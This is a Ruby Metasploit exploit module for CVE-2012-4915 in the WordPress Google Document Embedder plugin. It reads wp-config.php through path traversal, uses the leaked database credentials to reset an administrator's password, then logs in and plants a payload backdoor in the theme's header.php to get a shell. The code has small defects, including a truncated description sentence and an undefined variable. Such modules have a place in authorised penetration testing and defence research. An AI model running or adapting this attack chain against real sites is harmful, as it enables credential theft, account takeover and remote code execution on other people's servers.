# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rbmysql&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;WordPress Plugin Google Document Embedder Arbitrary File Disclosure&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an arbitrary file disclosure flaw in the WordPress
                blogging software plugin known as Google Document Embedder. The vulnerability allows for
                database credential disclosure via the /libs/pdf.php script. The Google Document Embedder
                plug-in versions 2.4.6 and below are vulnerable. This exploit only works when the MySQL
 
                Please note: The admin password may get changed if the exploit does not run to the end.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Charlie Eriksen&#039;,
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-4915&#039;],
                    [&#039;OSVDB&#039;, &#039;88891&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/50832&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;ConnectionType&#039; => &#039;find&#039;,
                        },
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Jan 03 2013&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to WordPress&#039;, &#039;/&#039;]),
                OptString.new(&#039;PLUGINSPATH&#039;, [true, &#039;The relative path to the plugins folder&#039;, &#039;wp-content/plugins/&#039;]),
                OptString.new(&#039;ADMINPATH&#039;, [true, &#039;The relative path to the admin folder&#039;, &#039;wp-admin/&#039;]),
                OptString.new(&#039;THEMESPATH&#039;, [true, &#039;The relative path to the admin folder&#039;, &#039;wp-content/themes/&#039;])
            ], self.class)
    end
 
    def check
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        plugins_uri = String.new(uri)
        plugins_uri << datastore[&#039;PLUGINSPATH&#039;]
        plugins_uri << &#039;/&#039; if plugins_uri[-1,1] != &#039;/&#039;
 
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{plugins_uri}google-document-embedder/libs/pdf.php",
        })
 
        if res and res.code == 200
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        plugins_uri = String.new(uri)
        plugins_uri << datastore[&#039;PLUGINSPATH&#039;]
        plugins_uri << &#039;/&#039; if plugins_uri[-1,1] != &#039;/&#039;
        admin_uri = String.new(uri)
        admin_uri << datastore[&#039;ADMINPATH&#039;]
        admin_uri << &#039;/&#039; if plugins_uri[-1,1] != &#039;/&#039;
        themes_uri = String.new(uri)
        themes_uri << datastore[&#039;THEMESPATH&#039;]
        themes_uri << &#039;/&#039; if plugins_uri[-1,1] != &#039;/&#039;
 
        print_status(&#039;Fetching wp-config.php&#039;)
        res = send_request_cgi({
            &#039;method&#039;     => &#039;GET&#039;,
            &#039;uri&#039;        => "#{plugins_uri}google-document-embedder/libs/pdf.php",
            &#039;vars_get&#039;   =>
                {
                    &#039;fn&#039;   => "#{rand_text_alphanumeric(4)}.pdf",
                    &#039;file&#039; => "#{&#039;../&#039; * plugins_uri.count(&#039;/&#039;)}wp-config.php",
                }
        })
 
        if res and res.body =~ /allow_url_fopen/
            fail_with(Exploit::Failure::NotVulnerable, &#039;allow_url_fopen and curl are both disabled&#039;)
        elsif res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        end
 
        config = parse_wp_config(res.body)
        if not [&#039;DB_HOST&#039;, &#039;DB_PORT&#039;, &#039;DB_USER&#039;, &#039;DB_PASSWORD&#039;, &#039;DB_NAME&#039;].all? { |parameter| config.has_key?(parameter) }
            fail_with(Exploit::Failure::UnexpectedReply, "The config file did not parse properly")
        end
        begin
            @mysql_handle = ::RbMysql.connect({
                :host           => config[&#039;DB_HOST&#039;],
                :port           => config[&#039;DB_PORT&#039;],
                :read_timeout   => 300,
                :write_timeout  => 300,
                :socket         => nil,
                :user           => config[&#039;DB_USER&#039;],
                :password       => config[&#039;DB_PASSWORD&#039;],
                :db             => config[&#039;DB_NAME&#039;]
            })
        rescue Errno::ECONNREFUSED,
            RbMysql::ClientError,
            Errno::ETIMEDOUT,
            RbMysql::AccessDeniedError,
            RbMysql::HostNotPrivileged
            fail_with(Exploit::Failure::NotVulnerable, &#039;Unable to connect to the MySQL server&#039;)
        end
        res = @mysql_handle.query("SELECT user_login, user_pass FROM #{config[&#039;DB_PREFIX&#039;]}users U
                                    INNER JOIN #{config[&#039;DB_PREFIX&#039;]}usermeta M ON M.user_id = U.ID AND M.meta_key = &#039;wp_user_level&#039; AND meta_value = &#039;10&#039; LIMIT 1")
 
        if res.nil? or res.size <= 0
            fail_with(Exploit::Failure::UnexpectedReply, &#039;No admin was account found&#039;)
        end
 
        user = res.first
 
        new_password = rand_text_alphanumeric(8)
        @mysql_handle.query("UPDATE #{config[&#039;DB_PREFIX&#039;]}users SET user_pass = &#039;#{::Rex::Text.md5(new_password)}&#039; WHERE user_login = &#039;#{user[0]}&#039;")
        print_warning("Admin password changed to: #{new_password}")
 
        admin_cookie = get_wp_cookie(uri, user[0], new_password)
 
        theme, nonce, old_content = get_wp_theme(admin_uri, admin_cookie)
 
        print_warning("Editing theme #{theme}")
        set_wp_theme(admin_uri, admin_cookie, nonce, theme, payload.encoded)
 
        print_status("Calling backdoor")
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{themes_uri}#{theme}/header.php",
        })
 
        if res and res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        end
 
        set_wp_theme(admin_uri, admin_cookie, nonce, theme, old_content)
 
        @mysql_handle.query("UPDATE #{config[&#039;DB_PREFIX&#039;]}users SET user_pass = &#039;#{user[1]}&#039; WHERE user_login = &#039;#{user[0]}&#039;")
 
        print_status("Shell should have been acquired. Disabled backdoor")
    end
 
    def parse_wp_config(body)
        print_status("wp-config.php saved in: #{p}")
        print_status("Parsing config file")
        values = {}
 
        body.each_line do |line|
            if line =~ /define/
                key_pair = line.scan(/(&#039;|")([^&#039;"]*)(&#039;|")/)
                if key_pair.length == 2
                    values[key_pair[0][1]] = key_pair[1][1]
                end
            end
        end
        #Extract the port from DB_HOST and normalize DB_HOST
        values[&#039;DB_PORT&#039;] = values[&#039;DB_HOST&#039;].include?(&#039;:&#039;) ? values[&#039;DB_HOST&#039;].split(&#039;:&#039;)[1] : 3306
 
        if values[&#039;DB_HOST&#039;] =~ /(localhost|127.0.0.1)/
            print_status("DB_HOST config value was a loopback address. Trying to resolve to a proper IP")
            values[&#039;DB_HOST&#039;] = ::Rex::Socket.getaddress(datastore[&#039;RHOST&#039;])
        end
 
        return values
    end
 
    def get_wp_cookie(uri, username, password)
        res = send_request_cgi({
            &#039;method&#039;     => &#039;POST&#039;,
            &#039;uri&#039;        => "#{uri}wp-login.php",
            &#039;vars_post&#039;  =>
                {
                    &#039;log&#039;        => username,
                    &#039;pwd&#039;        => password,
                    &#039;wp-submit&#039;  => &#039;Log+In&#039;,
                    &#039;testcookie&#039; => &#039;1&#039;,
                },
        })
 
        if res and res.code == 200
            fail_with(Exploit::Failure::UnexpectedReply, &#039;Admin login failed&#039;)
        elsif res and res.code != 302
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        end
 
        admin_cookie = &#039;&#039;
        (res.headers[&#039;Set-Cookie&#039;] || &#039;&#039;).split(&#039;,&#039;).each do |cookie|
            admin_cookie << cookie.split(&#039;;&#039;)[0]
            admin_cookie << &#039;;&#039;
        end
 
        if admin_cookie.empty?
            fail_with(Exploit::Failure::UnexpectedReply, &#039;The resulting cookie was empty&#039;)
        end
 
        return admin_cookie
    end
 
    def get_wp_theme(admin_uri, admin_cookie)
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{admin_uri}theme-editor.php?file=header.php",
            &#039;cookie&#039; => admin_cookie,
        })
 
        if res and res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        elsif res and res.body.scan(/<input.+?name="submit".+?class="button button-primary"/).length == 0
        end
 
        nonce = res.body.scan(/<input.+?id="_wpnonce".+?value="(.+?)"/)[0][0].to_s
        old_content = Rex::Text.html_decode(Rex::Text.html_decode(res.body.scan(/<textarea.+?id="newcontent".+?>(.*)<\/textarea>/m)[0][0].to_s))
        theme = res.body.scan(/<input.+?name="theme".+?value="(.+?)"/)[0][0].to_s
 
        return [theme, nonce, old_content]
    end
 
    def set_wp_theme(admin_uri, admin_cookie, nonce, theme, new_content)
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => "#{admin_uri}theme-editor.php?",
            &#039;cookie&#039;    => admin_cookie,
            &#039;vars_post&#039; =>
                {
                    &#039;_wpnonce&#039;   => nonce,
                    &#039;theme&#039;      => theme,
                    &#039;newcontent&#039; => new_content,
                    &#039;action&#039;     => &#039;update&#039;,
                    &#039;file&#039;       => &#039;header.php&#039;
                },
        })
 
        if res and res.code != 302
            fail_with(Exploit::Failure::UnexpectedReply, "Unexpected reply - #{res.code}")
        end
    end
 
end

